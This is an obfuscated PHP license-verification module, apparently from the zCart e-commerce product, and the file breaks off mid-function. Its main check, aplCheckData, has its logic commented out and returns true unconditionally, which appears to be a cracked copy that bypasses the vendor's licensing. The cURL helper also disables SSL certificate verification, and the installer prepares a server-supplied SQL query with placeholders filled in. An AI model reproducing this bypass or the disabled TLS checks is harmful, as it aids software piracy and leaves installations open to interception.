<?php
/*
* Copyright (C) Incevio Systems, Inc - All Rights Reserved
* Unauthorized copying of this file, via any medium is strictly prohibited
* Proprietary and confidential
* Written by Munna Khan <help.zcart@gmail.com>, September 2018
*/
 function aplCustomEncrypt($string, $key) 
 { 
 	$encrypted_string = null; 
 	if (!(!empty($string) && !empty($key))) { goto npZkP; } 
 	$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("\141\x65\163\55\x32\x35\66\55\x63\142\x63")); 
 	$encrypted_string = openssl_encrypt($string, "\141\x65\163\55\62\65\x36\55\x63\142\x63", $key, 0, $iv); 
 	$encrypted_string = base64_encode($encrypted_string . "\x3a\x3a" . $iv); 
 	npZkP: return $encrypted_string; 
 } 
 function aplCustomDecrypt($string, $key) 
 { 
 	$decrypted_string = null; 
 	if (!(!empty($string) && !empty($key))) { goto qW2wA; } 
 	$string = base64_decode($string); 
 	if (!stristr($string, "\72\72")) { goto Op_zv; } 
 	$string_iv_array = explode("\x3a\72", $string, 2); 
 	if (!(!empty($string_iv_array) && count($string_iv_array) == 2)) { goto nzmGH; }
 	list($encrypted_string, $iv) = $string_iv_array; 
 	$decrypted_string = openssl_decrypt($encrypted_string, "\141\x65\x73\55\62\x35\x36\x2d\x63\x62\x63", $key, 0, $iv); 
 	nzmGH: Op_zv: qW2wA: return $decrypted_string; 
 } 
 function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF) 
 { 
 	$result = false;
 	 if (!(!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("\157\x70\164\x69\157\x6e\163" => array("\x6d\151\156\137\162\x61\x6e\147\x65" => $min_value, "\155\x61\170\x5f\162\141\x6e\x67\x65" => $max_value))) !== false)) { goto Nia54; } 
 	 $result = true;
 	  Nia54: return $result; 
 } 
 function aplValidateRawDomain($url) 
 { 
 	$result = false; 
 	if (empty($url)) { goto JgQfZ; } 
 	if (preg_match("\x2f\x5e\x5b\141\x2d\x7a\x30\x2d\71\x2d\x2e\135\x2b\x5c\56\133\x61\55\172\x5c\56\x5d\173\62\x2c\x37\175\44\x2f", strtolower($url))) { goto laDaO; } 
 	$result = false; 
 	goto iRFwX; 
 	laDaO: $result = true; 
 	iRFwX: JgQfZ: return $result; 
 } 
 function aplGetCurrentUrl($remove_last_slash = null) 
 {
  	$protocol = "\150\x74\x74\x70";
   	$host = null;
    $script = null;
    $params = null;
    $current_url = null;
    if (!(isset($_SERVER["\110\x54\124\120\x53"]) && $_SERVER["\110\124\124\120\123"] !== "\x6f\x66\146" || isset($_SERVER["\x48\x54\x54\x50\137\130\x5f\x46\x4f\122\x57\101\x52\104\x45\x44\137\120\x52\x4f\x54\117"]) && $_SERVER["\110\x54\124\120\137\130\x5f\x46\x4f\x52\x57\x41\122\x44\x45\x44\x5f\x50\122\117\124\117"] == "\x68\x74\164\x70\x73")) { goto rnUcg; }
    $protocol = "\x68\164\x74\x70\x73"; 
    rnUcg: if (!isset($_SERVER["\110\x54\124\120\x5f\110\117\x53\124"])) { goto Emotv; } 
    $host = $_SERVER["\x48\124\124\120\137\110\117\x53\x54"];
    Emotv: if (!isset($_SERVER["\x53\x43\122\x49\x50\124\x5f\x4e\x41\x4d\x45"])) { goto f2zNE; } 
    $script = $_SERVER["\123\103\122\111\120\x54\x5f\x4e\101\115\x45"]; 
    f2zNE: if (!isset($_SERVER["\x51\x55\105\x52\x59\x5f\123\124\122\x49\116\107"])) { goto Jr26Y; } 
    $params = $_SERVER["\x51\x55\105\122\x59\137\x53\124\122\x49\x4e\107"]; 
    Jr26Y: if (!(!empty($protocol) && !empty($host) && !empty($script))) { goto lhdxH; } 
    $current_url = $protocol . "\72\57\57" . $host . $script; if (empty($params)) { goto fN2zY; } 
    $current_url .= "\x3f" . $params; fN2zY: if (!($remove_last_slash == 1)) { goto xLdYr; } 
    Bng4J: if (!(substr($current_url, -1) == "\x2f")) { goto i0odL; }
    $current_url = substr($current_url, 0, -1);
    goto Bng4J; 
    i0odL: xLdYr: lhdxH: return $current_url; 
} 
function aplGetRawDomain($url) { 
	$raw_domain = null; 
	if (empty($url)) { goto ybI8h; }
	$url_array = parse_url($url); 
	if (!empty($url_array["\x73\143\150\x65\x6d\145"])) { goto TAAaZ; }
	$url = "\x68\164\x74\160\72\57\57" . $url;
	$url_array = parse_url($url); 
	TAAaZ: if (empty($url_array["\150\x6f\163\164"])) { goto Sn9tX; } 
	$raw_domain = $url_array["\150\x6f\x73\x74"]; 
	$raw_domain = trim(str_ireplace("\x77\167\167\56", '', filter_var($raw_domain, FILTER_SANITIZE_URL))); 
	Sn9tX: ybI8h: return $raw_domain; 
} 
function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash) 
{ 
	if (!filter_var($url, FILTER_VALIDATE_URL)) { goto q0qoF; }
	$url_array = parse_url($url); 
	$url = str_ireplace($url_array["\163\x63\x68\145\x6d\145"] . "\x3a\x2f\x2f", '', $url);
	if ($remove_path == 1) { goto y2jWa; } 
	$last_slash_position = strripos($url, "\57"); 
	if (!($last_slash_position > 0)) { goto VpsEb; } 
	$url = substr($url, 0, $last_slash_position + 1); 
	VpsEb: goto dFdZl; 
	y2jWa: $first_slash_position = stripos($url, "\57"); 
	if (!($first_slash_position > 0)) { goto KsKQx; } 
	$url = substr($url, 0, $first_slash_position + 1); 
	KsKQx: dFdZl: if (!($remove_scheme != 1)) { goto SuaLd; } 
	$url = $url_array["\163\143\x68\145\155\145"] . "\x3a\57\x2f" . $url; 
	SuaLd: if (!($remove_www == 1)) { goto NPjUD; } 
	$url = str_ireplace("\x77\167\167\x2e", '', $url);
	NPjUD: if (!($remove_last_slash == 1)) { goto pmjoh; } 
	paFHE: if (!(substr($url, -1) == "\57")) { goto M4lxh; } 
	$url = substr($url, 0, -1); goto paFHE; 
	M4lxh: pmjoh: q0qoF: return trim($url); 
} 
function aplCustomPost($url, $post_info = null, $refer = null) 
{ 
	$user_agent = "\160\x68\x70\155\151\154\x6c\x69\157\156\x20\143\x55\122\114"; 
	$connect_timeout = 10; 
	$server_response_array = array(); 
	$formatted_headers_array = array(); 
	if (!(filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info))) { goto vqxwP; } 
	if (!(empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL))) { goto pk1It; } 
	$refer = $url; 
	pk1It: $ch = curl_init(); 
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout); 
	curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout); 
	curl_setopt($ch, CURLOPT_REFERER, $refer); 
	curl_setopt($ch, CURLOPT_POST, 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	curl_setopt($ch, CURLOPT_MAXREDIRS, 10); 
	curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use(&$formatted_headers_array) { $len = strlen($header);
	 $header = explode("\72", $header, 2); 
	 if (!(count($header) < 2)) { goto lBVyK; } 
	 return $len;
	 lBVyK: $name = strtolower(trim($header[0])); 
	 $formatted_headers_array[$name] = trim($header[1]);
	 return $len;
	}); 
	$result = curl_exec($ch); 
	$curl_error = curl_error($ch); 
	curl_close($ch); 
	$server_response_array["\150\145\141\x64\145\x72\x73"] = $formatted_headers_array; 
	$server_response_array["\x65\x72\x72\157\x72"] = $curl_error; 
	$server_response_array["\142\157\x64\171"] = $result; 
	vqxwP: return $server_response_array; 
} 

function aplVerifyDateTime($datetime, $format) 
{ 
	$result = false; 
	if (!(!empty($datetime) && !empty($format))) { goto q11rb; } 
	$datetime = DateTime::createFromFormat($format, $datetime); 
	$errors = DateTime::getLastErrors(); 
	if (!($datetime && empty($errors["\167\x61\162\x6e\151\156\x67\x5f\x63\157\165\x6e\164"]))) { goto v9VMq; 
	} 
	$result = true; 
	v9VMq: q11rb: return $result; 
} 
function aplGetDaysBetweenDates($date_from, $date_to) { 
	$number_of_days = 0; 
	if (!(aplVerifyDateTime($date_from, "\x59\x2d\155\55\x64") && aplVerifyDateTime($date_to, "\x59\x2d\x6d\55\x64"))) { goto G85Tx; } 
	$date_to = new DateTime($date_to); 
	$date_from = new DateTime($date_from); 
	$number_of_days = $date_from->diff($date_to)->format("\x25\141"); 
	G85Tx: return $number_of_days; 
} 
function aplParseXmlTags($content, $tag_name) { 
	$parsed_value = null; 
	if (!(!empty($content) && !empty($tag_name))) { goto TAtyc; } 
	preg_match_all("\x2f\x3c" . preg_quote($tag_name, "\57") . "\76\50\56\x2a\x3f\51\x3c\x5c\57" . preg_quote($tag_name, "\57") . "\76\57\x69\x6d\163", $content, $output_array, PREG_SET_ORDER); 
	if (empty($output_array[0][1])) { goto sLyJi; } 
	$parsed_value = trim($output_array[0][1]); 
	sLyJi: TAtyc: return $parsed_value; 
} 
function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) { $notifications_array = array(); 
	if (!empty($content_array)) { goto sC3UR; } 
	$notifications_array["\x6e\157\164\151\146\x69\143\x61\164\151\x6f\156\x5f\x63\141\x73\x65"] = "\x6e\x6f\164\151\x66\151\x63\x61\164\x69\157\156\x5f\x6e\157\x5f\x63\157\x6e\156\145\x63\164\151\157\x6e"; 
	$notifications_array["\156\x6f\x74\x69\146\x69\143\141\164\x69\x6f\x6e\137\x74\x65\170\164"] = APL_NOTIFICATION_NO_CONNECTION; goto ni4Bz; 
	sC3UR: if (!empty($content_array["\x68\x65\141\144\145\x72\x73"]["\x6e\157\164\151\x66\151\x63\141\164\x69\157\x6e\137\163\x65\162\166\145\162\137\x73\x69\x67\156\x61\x74\165\x72\x65"]) && aplVerifyServerSignature($content_array["\150\x65\x61\144\x65\162\163"]["\156\x6f\164\151\x66\x69\143\x61\x74\x69\x6f\156\137\163\x65\162\x76\x65\x72\137\163\151\147\156\141\164\165\x72\145"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) { goto daICK; } 
	$notifications_array["\156\157\x74\x69\x66\151\143\x61\164\x69\x6f\156\x5f\x63\141\163\x65"] = "\x6e\x6f\164\151\x66\151\143\x61\x74\x69\157\x6e\x5f\151\x6e\166\141\154\151\x64\137\162\145\163\x70\157\x6e\x73\x65"; 
	$notifications_array["\x6e\x6f\x74\x69\146\x69\x63\x61\x74\151\157\156\x5f\x74\x65\170\164"] = APL_NOTIFICATION_INVALID_RESPONSE; 
	goto E1U6l; 
	daICK: $notifications_array["\x6e\x6f\x74\x69\146\151\x63\141\164\x69\x6f\156\137\143\x61\163\x65"] = $content_array["\150\x65\141\x64\x65\162\x73"]["\x6e\x6f\164\x69\146\x69\x63\141\164\151\x6f\x6e\137\143\141\163\145"]; 
	$notifications_array["\x6e\157\164\x69\x66\x69\143\141\164\x69\x6f\156\x5f\x74\x65\x78\164"] = $content_array["\150\145\x61\x64\145\162\x73"]["\156\157\164\151\146\x69\143\141\164\x69\x6f\x6e\137\164\145\x78\164"]; 
	if (empty($content_array["\x68\145\141\x64\x65\162\163"]["\156\157\x74\x69\146\x69\143\141\x74\x69\x6f\156\137\x64\x61\164\141"])) { goto ARKUW; } 

	$notifications_array["\x6e\x6f\164\x69\x66\151\143\x61\x74\151\x6f\x6e\x5f\x64\x61\164\141"] = json_decode($content_array["\x68\x65\141\144\x65\x72\163"]["\156\x6f\164\x69\146\151\x63\141\x74\151\x6f\156\x5f\x64\x61\164\x61"], true); 
	ARKUW: E1U6l: ni4Bz: return $notifications_array; 
} 
function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) 
{ 
	$script_signature = null; 
	$root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL)); 
	if (!(!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) { goto f0Bw1; } 
	$script_signature = hash("\163\150\x61\62\x35\x36", gmdate("\131\55\x6d\x2d\x64") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . APL_PRODUCT_ID . implode('', $root_ips_array)); 
	f0Bw1: return $script_signature; 
} 
function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE) 
{ 
	$result = false; 
	$root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL)); 
	if (!(!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) { goto I2DqL; } 
	if (!(hash("\163\x68\x61\x32\65\x36", implode('', $root_ips_array) . APL_PRODUCT_ID . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("\x59\x2d\155\55\144")) == $notification_server_signature)) { goto HS7dJ; } 
	$result = true; HS7dJ: I2DqL: return $result; 
} 
function aplCheckSettings() 
{
 	$notifications_array = array(); 
 	if (!(empty(APL_SALT) || APL_SALT == "\163\157\x6d\x65\x5f\x72\141\156\144\157\x6d\x5f\164\145\x78\164")) { goto pc89A; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT; 
 	pc89A: if (!(!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1)))) { goto FPEcX; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL; 
 	FPEcX: if (filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) { goto ru8w5; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID; 
 	ru8w5: if (aplValidateIntegerValue(APL_DAYS, 1, 365)) { goto SfX63; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD; 
 	SfX63: if (!(APL_STORAGE != "\104\101\124\101\x42\x41\123\105" && APL_STORAGE != "\x46\x49\114\x45")) { goto c9UwE; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE; 
 	c9UwE: if (!(APL_STORAGE == "\x44\x41\124\x41\102\x41\123\105" && !ctype_alnum(str_ireplace(array("\137"), '', APL_DATABASE_TABLE)))) { goto KLPmw; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE; 
 	KLPmw: if (!(APL_STORAGE == "\106\x49\x4c\105" && !@is_writable(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION))) { goto DEKuH; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE; 
 	DEKuH: if (!(!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP))) { goto zirQ4; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP; 
 	zirQ4: if (!(!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL))))) { goto flhIM; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS; 
 	flhIM: if (!(defined("\x41\120\x4c\137\x52\117\117\x54\x5f\116\x41\x4d\x45\x53\105\x52\x56\x45\x52\123") && !empty(APL_ROOT_NAMESERVERS))) { goto MFg40; } 
 	foreach (APL_ROOT_NAMESERVERS as $nameserver) { 
 		if (aplValidateRawDomain($nameserver)) { goto B_bJd; } 
 		$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS; 
 		goto NZess; B_bJd: a2533: 
 	} 
 	NZess: MFg40: if (!(defined("\101\120\x4c\x5f\122\x4f\x4f\x54\x5f\116\x41\115\105\x53\105\122\x56\x45\x52\123") && !empty(APL_ROOT_NAMESERVERS))) { goto IPHMA; } 
 	$apl_root_nameservers_array = APL_ROOT_NAMESERVERS; 
 	$fetched_nameservers_array = array(); 
 	$dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS); 
 	foreach ($dns_records_array as $record) { 
 		$fetched_nameservers_array[] = $record["\164\x61\162\147\145\x74"]; 
 		lQg5U: 
 	} 
 	adL1n: $apl_root_nameservers_array = array_map("\x73\x74\162\164\157\x6c\157\x77\x65\162", $apl_root_nameservers_array); 
 	$fetched_nameservers_array = array_map("\x73\164\162\x74\157\x6c\157\x77\x65\162", $fetched_nameservers_array); 
 	sort($apl_root_nameservers_array); 
 	sort($fetched_nameservers_array); 
 	if (!($apl_root_nameservers_array != $fetched_nameservers_array)) { goto JWqwD; } 
 	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS; 
 	JWqwD: IPHMA: return $notifications_array; 
 } 
 function aplParseLicenseFile() 
 { 
 	$license_data_array = array(); 
 	if (!@is_readable(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION)) { goto mFePx; } 
 	$file_content = file_get_contents(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION); 
 	preg_match_all("\57\x3c\50\x5b\x41\55\132\x5f\135\x2b\51\x3e\50\56\x2a\x3f\51\x3c\134\57\50\x5b\101\55\x5a\137\x5d\x2b\x29\76\x2f", $file_content, $matches, PREG_SET_ORDER); 
 	if (empty($matches)) { goto x23XX; } 
 	foreach ($matches as $value) { 
 		if (!(!empty($value[1]) && $value[1] == $value[3])) { goto kJzci; } 
 		$license_data_array[$value[1]] = $value[2]; 
 		kJzci: nV0Xl: 
 	} 
 	tkLiD: x23XX: mFePx: return $license_data_array; 
 } 
 function aplGetLicenseData($MYSQLI_LINK = null) 
 { 
 	$settings_row = array(); 
 	if (!(APL_STORAGE == "\104\101\x54\101\102\x41\123\105")) { goto ERXAU; } 
 	$settings_results = @mysqli_query($MYSQLI_LINK, "\123\105\x4c\105\103\x54\x20\x2a\x20\x46\x52\x4f\115\x20" . APL_DATABASE_TABLE); 
 	$settings_row = @mysqli_fetch_assoc($settings_results); 
 	ERXAU: if (!(APL_STORAGE == "\x46\x49\114\105")) { goto KOnIi; } 
 	$settings_row = aplParseLicenseFile();
 	KOnIi: return $settings_row;
 } 
 function aplCheckConnection() 
 { 
 	$notifications_array = array(); 
 	$content_array = aplCustomPost(APL_ROOT_URL . "\57\141\x70\x6c\x5f\143\141\x6c\x6c\x62\x61\143\153\163\57\143\x6f\156\x6e\145\143\x74\151\x6f\156\x5f\164\145\163\164\x2e\x70\150\x70", "\160\x72\157\144\x75\x63\164\137\x69\144\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\143\157\x6e\156\x65\x63\164\151\x6f\156\137\x68\141\163\150\x3d" . rawurlencode(hash("\x73\150\141\62\x35\66", "\x63\157\x6e\x6e\145\143\164\151\x6f\x6e\137\x74\x65\x73\x74"))); 
 	if (!empty($content_array)) { goto OfwKB; } 
 	$notifications_array["\156\x6f\164\x69\x66\151\143\141\x74\151\157\x6e\x5f\x63\141\163\145"] = "\x6e\157\164\151\x66\151\x63\x61\x74\x69\157\156\x5f\156\157\x5f\143\157\156\156\145\x63\164\151\157\156"; 
 	$notifications_array["\x6e\157\x74\x69\x66\151\143\x61\164\151\157\156\x5f\164\145\170\164"] = APL_NOTIFICATION_NO_CONNECTION; 
 	goto gtcal; 
 	OfwKB: if (!($content_array["\142\x6f\x64\171"] != "\74\x63\157\156\x6e\145\143\164\151\157\x6e\x5f\164\145\x73\164\x3e\117\x4b\74\x2f\143\x6f\156\156\145\143\164\x69\x6f\156\137\164\x65\163\164\76")) { goto Z4oDi; } 
 	$notifications_array["\x6e\157\x74\x69\x66\151\143\141\x74\151\157\x6e\x5f\143\141\x73\x65"] = "\156\157\164\151\x66\x69\x63\x61\x74\x69\x6f\156\137\x69\156\166\141\154\x69\144\137\x72\145\x73\x70\157\156\x73\x65"; 
 	$notifications_array["\156\157\x74\151\x66\x69\x63\x61\164\x69\157\x6e\x5f\164\x65\x78\x74"] = APL_NOTIFICATION_INVALID_RESPONSE; Z4oDi: gtcal: return $notifications_array; 
 } 
 function aplCheckData($MYSQLI_LINK = null) 
 { 
 	/*$error_detected = 0; 
 	$cracking_detected = 0; 
 	$data_check_result = false; 
 	extract(aplGetLicenseData($MYSQLI_LINK)); 
 	if (!(!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD))) { goto Cfgm_; } 
 	$LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY); 
 	$LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY); 
 	if (!(!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1)))) { goto UnG4c; }
 	$error_detected = 1; 
 	UnG4c: if (!(filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("{$ROOT_URL}\57", 1, 1, 0, 1)) === false)) { goto vu_XZ; } 
 	$error_detected = 1; 
 	vu_XZ: if (!(empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("\163\x68\141\62\x35\66", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE))) { goto zcvdf; } 
 	$error_detected = 1; 
 	zcvdf: if (!(empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL)))) { goto qpHW2; } 
 	$error_detected = 1; 
 	qpHW2: if (aplVerifyDateTime($LCD, "\x59\55\x6d\x2d\144")) { goto Q2n08; } 
 	$error_detected = 1; 
 	Q2n08: if (aplVerifyDateTime($LRD, "\x59\x2d\x6d\55\144")) { goto Zior1; } 
 	$error_detected = 1; 
 	Zior1: if (!(aplVerifyDateTime($LCD, "\131\55\x6d\55\x64") && $LCD > date("\131\x2d\155\x2d\144", strtotime("\53\61\40\144\x61\x79")))) { goto xgxiS; } 
 	$error_detected = 1; 
 	$cracking_detected = 1; 
 	xgxiS: if (!(aplVerifyDateTime($LRD, "\131\x2d\155\55\x64") && $LRD > date("\x59\x2d\155\55\x64", strtotime("\x2b\x31\x20\x64\x61\x79")))) { goto QOk6g; } 
 	$error_detected = 1; 
 	$cracking_detected = 1; 
 	QOk6g: if (!(aplVerifyDateTime($LCD, "\131\x2d\x6d\55\x64") && aplVerifyDateTime($LRD, "\131\55\155\x2d\x64") && $LCD > $LRD)) { goto rfibx; } 
 	$error_detected = 1; 
 	$cracking_detected = 1; 
 	rfibx: if (!($cracking_detected == 1 && APL_DELETE_CRACKED == "\131\105\x53")) { goto QYHcH; } 
 	aplDeleteData($MYSQLI_LINK); 
 	QYHcH: if (!($error_detected != 1 && $cracking_detected != 1)) { goto SV5s5; } 
 	$data_check_result = true; 
 	SV5s5: Cfgm_: return $data_check_result;*/ 

 	return true;
 } 
 function aplVerifyEnvatoPurchase($LICENSE_CODE = null) 
 { 
 	$notifications_array = array(); 
 	$content_array = aplCustomPost(APL_ROOT_URL . "\57\x61\x70\154\x5f\143\x61\154\x6c\142\141\143\153\x73\x2f\x76\x65\162\151\146\x79\x5f\145\x6e\166\x61\164\157\x5f\x70\x75\162\x63\150\141\163\145\x2e\160\150\160", "\160\162\x6f\x64\165\x63\x74\137\151\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\x26\154\151\143\x65\x6e\163\145\x5f\143\x6f\144\145\75" . rawurlencode($LICENSE_CODE) . "\46\x63\x6f\x6e\156\145\x63\164\x69\157\156\137\x68\141\163\150\75" . rawurlencode(hash("\163\150\x61\62\65\66", "\x76\145\162\x69\x66\x79\x5f\x65\156\x76\141\x74\157\x5f\160\165\162\x63\x68\141\163\x65"))); 
 	if (!empty($content_array)) { goto IELUl; } 
 	$notifications_array["\x6e\157\x74\151\x66\151\x63\141\164\151\157\156\137\x63\141\x73\145"] = "\x6e\x6f\x74\151\146\x69\x63\141\x74\151\x6f\156\137\156\x6f\137\143\157\156\x6e\145\143\164\x69\157\x6e"; 
 	$notifications_array["\x6e\x6f\x74\x69\146\x69\x63\x61\164\x69\x6f\156\137\164\x65\170\164"] = APL_NOTIFICATION_NO_CONNECTION; 
 	goto YmCPM; 
 	IELUl: if (!($content_array["\142\x6f\x64\x79"] != "\x3c\166\145\x72\x69\x66\171\x5f\145\156\x76\141\164\x6f\137\x70\165\x72\143\x68\141\x73\145\76\x4f\x4b\74\57\166\x65\x72\x69\146\171\137\x65\x6e\x76\141\x74\157\137\160\165\x72\143\x68\141\163\145\x3e")) { goto KMSCk; } 
 	$notifications_array["\156\157\x74\151\x66\x69\143\x61\164\x69\x6f\x6e\137\x63\141\163\145"] = "\x6e\x6f\x74\x69\x66\151\143\x61\164\x69\157\156\x5f\x69\x6e\x76\x61\154\x69\144\x5f\x72\145\x73\160\157\156\163\x65"; 
 	$notifications_array["\x6e\157\164\151\146\151\143\x61\x74\151\157\156\137\164\x65\170\164"] = APL_NOTIFICATION_INVALID_RESPONSE; 
 	KMSCk: YmCPM: return $notifications_array; 
 } 
 function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null) 
 { 
 	$notifications_array = array(); 
 	$apl_core_notifications = aplCheckSettings(); 
 	if (empty($apl_core_notifications)) { goto Ro8pL; } 
 	$notifications_array["\156\x6f\164\151\146\x69\143\x61\x74\151\x6f\x6e\137\x63\x61\x73\x65"] = "\x6e\157\x74\151\x66\151\143\x61\164\x69\157\x6e\137\163\x63\x72\151\160\164\137\143\x6f\x72\162\165\x70\x74\145\x64"; 
 	$notifications_array["\156\x6f\164\x69\x66\151\143\x61\x74\151\157\156\137\x74\x65\x78\x74"] = implode("\73\x20", $apl_core_notifications); 
 	goto iZYyb; 
 	Ro8pL: if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) { goto eP8EK; } 
 	$INSTALLATION_HASH = hash("\163\150\x61\x32\x35\x36", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE); 
 	$post_info = "\160\x72\157\144\x75\x63\164\x5f\151\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\143\x6c\x69\145\x6e\164\x5f\145\x6d\x61\151\154\75" . rawurlencode($CLIENT_EMAIL) . "\x26\x6c\x69\x63\x65\x6e\x73\145\137\x63\157\144\145\x3d" . rawurlencode($LICENSE_CODE) . "\46\x72\157\157\x74\137\x75\x72\154\x3d" . rawurlencode($ROOT_URL) . "\x26\151\156\x73\164\141\x6c\x6c\141\164\151\x6f\x6e\x5f\x68\141\x73\150\x3d" . rawurlencode($INSTALLATION_HASH) . "\x26\154\x69\x63\145\x6e\x73\145\x5f\163\151\x67\156\x61\164\x75\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); 
 	$content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\160\x6c\137\143\141\x6c\x6c\142\x61\143\x6b\163\57\x6c\x69\x63\x65\156\163\145\137\151\156\163\164\x61\154\154\56\160\x68\x70", $post_info, $ROOT_URL); 
 	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); 
 	if (!($notifications_array["\156\x6f\164\x69\x66\x69\143\141\164\151\x6f\156\137\143\141\x73\145"] == "\156\157\164\x69\146\x69\143\141\164\151\157\156\x5f\x6c\x69\x63\145\x6e\x73\145\137\157\153")) { goto w__qM; } 
 	$INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("\x59\55\x6d\x2d\144"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL); 
 	$LCD = aplCustomEncrypt(date("\x59\55\155\x2d\144", strtotime("\55" . APL_DAYS . "\x20\144\x61\x79\163")), APL_SALT . $INSTALLATION_KEY); 
 	$LRD = aplCustomEncrypt(date("\x59\x2d\155\55\x64"), APL_SALT . $INSTALLATION_KEY); if (!(APL_STORAGE == "\x44\101\124\101\x42\101\123\105")) { goto JzDJ0; } 
 	$content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\154\137\143\x61\154\x6c\x62\x61\143\x6b\163\57\154\151\x63\145\156\x73\145\x5f\163\x63\x68\145\x6d\x65\56\x70\150\x70", $post_info, $ROOT_URL); 
 	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); 
 	if (!(!empty($notifications_array["\x6e\x6f\x74\151\146\x69\143\x61\x74\151\x6f\x6e\x5f\x64\141\x74\141"]) && !empty($notifications_array["\156\x6f\164\x69\x66\151\x63\141\164\x69\157\156\x5f\x64\141\164\141"]["\x73\143\x68\145\155\x65\x5f\161\165\x65\x72\171"]))) { goto p1Puf; } 
 	$mysql_bad_array = array("\45\101\120\x4c\137\x44\101\124\x41\102\x41\x53\105\137\x54\x41\102\114\105\x25", "\x25\x52\117\117\124\x5f\x55\x52\114\45", "\45\x43\114\111\105\x4e\x54\137\105\115\x41\x49\x4c\45", "\x25\114\111\103\105\x4e\123\x45\x5f\103\x4f\x44\105\x25", "\x25\x4c\x43\104\45", "\45\114\x52\x44\x25", "\x25\111\x4e\x53\124\x41\114\114\101\124\111\117\x4e\137\x4b\x45\131\45", "\x25\111\116\x53\124\x41\x4c\x4c\101\x54\111\x4f\x4e\137\110\x41\123\110\x25"); 
 	$mysql_good_array = array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH); 
